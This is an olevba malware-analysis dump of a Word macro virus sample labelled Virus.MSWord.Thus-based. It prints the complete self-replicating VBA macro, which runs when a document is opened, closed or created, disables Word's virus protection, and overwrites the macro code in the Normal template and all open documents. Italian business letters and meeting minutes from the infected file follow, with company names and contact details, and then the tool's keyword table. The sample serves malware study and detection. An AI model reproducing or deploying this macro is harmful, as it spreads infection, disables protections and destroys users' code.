olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-b40f8f628c3d148a5e2f5bf5e996cab4a27f2f11
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-b40f8f628c3d148a5e2f5bf5e996cab4a27f2f11 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub




















































































                                        C.C.I.A.A.MILANO
                                        REGISTRO IMPRESE
                                        
                                        .....  MILANO


                                        Carpi, lì 22.12.2000


OGGETTO: APERTURA UNITA ' LOCALE UBICATA NEL COMUNE DI VEDELAGO (TV) - VIA TERZA ARMATA 20  -   "AZIENDA AGRICOLA BARCON S.R.L." - C.F. 02663280366


            Con la presente siamo a trasmetterVi Mod. UL relativo alla pratica di APERTURA UNITA' LOCALE ubicata nel Comune di Vedelago - in Via Terza Armata - relativa alla società "AZIENDA AGRICOLA BARCON S.R.L." con sede in Carpi (MO) Via Lenin n. 1, C.F. 02663280366.

            Si trasmette inoltre busta preaffrancata per il ritorno della ricevuta.

            Distinti saluti.



                                    SELMI STUDIO ASSOCIATO

Per informazioni rivolgersi a:
SELMI STUDIO ASSOCIATO
Via Lenin n. 1
41012 Carpi (MO)
Tel. 059/695977
Fax 59 / 642268
e chiedere di Cinzia

Oggi 4 dicembre 2000, alle ore 15.00, si è riunita presso la sede sociale in Carpi (MO) Via Siemens 19/A, l'Assemblea dei Soci della Società "MAGDA M S.R.L." per discutere e deliberare sul seguente
ORDINE DEL GIORNO
1) Determinazione dei compensi da assegnare agli amministratori Sig. Meiners Giovanni e Sig.ra Bordini Magda nell'anno 2000;
2) Varie ed eventuali.
Assume la presidenza dell'Assemblea, a termini di Statuto, il Sig. Meiners Giovanni, il quale, dopo aver constatato la presenza di tutti i soci rappresentanti l'intero Capitale Sociale e del Consiglio di Amministrazione al completo, dichiara validamente costituita ed idonea a deliberare la presente adunanza previa nomina alle funzioni di segretario del Sig. Bordini Massimo, che accetta e ringrazia.
Il Presidente prende la parola sul primo punto posto all'ordine del giorno proponendo agli intervenuti di fissare un nuovo compenso per l'attività svolta dagli amministratori suddetti nell'anno 2000.
Udita la proposta, dopo breve discussione, gli intervenuti all'unanimità
DELIBERANO
di attribuire per l'anno 2000 i seguenti compensi lordi:
MEINERS GIOVANNI        Lit. 15.000.000 (quindicimilioni)
BORDINI MAGDA           Lit. 15.000.000 (quindicimilioni)
Null'altro essendovi da deliberare sul secondo punto posto all'ordine del giorno, la presente adunanza viene tolta alle ore 16.00 previa redazione, lettura e sottoscrizione del presente verbale.
IL PRESIDENTE                   IL SEGRETARIO
MEINERS GIOVANNI                BORDINI MASSIMO














































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

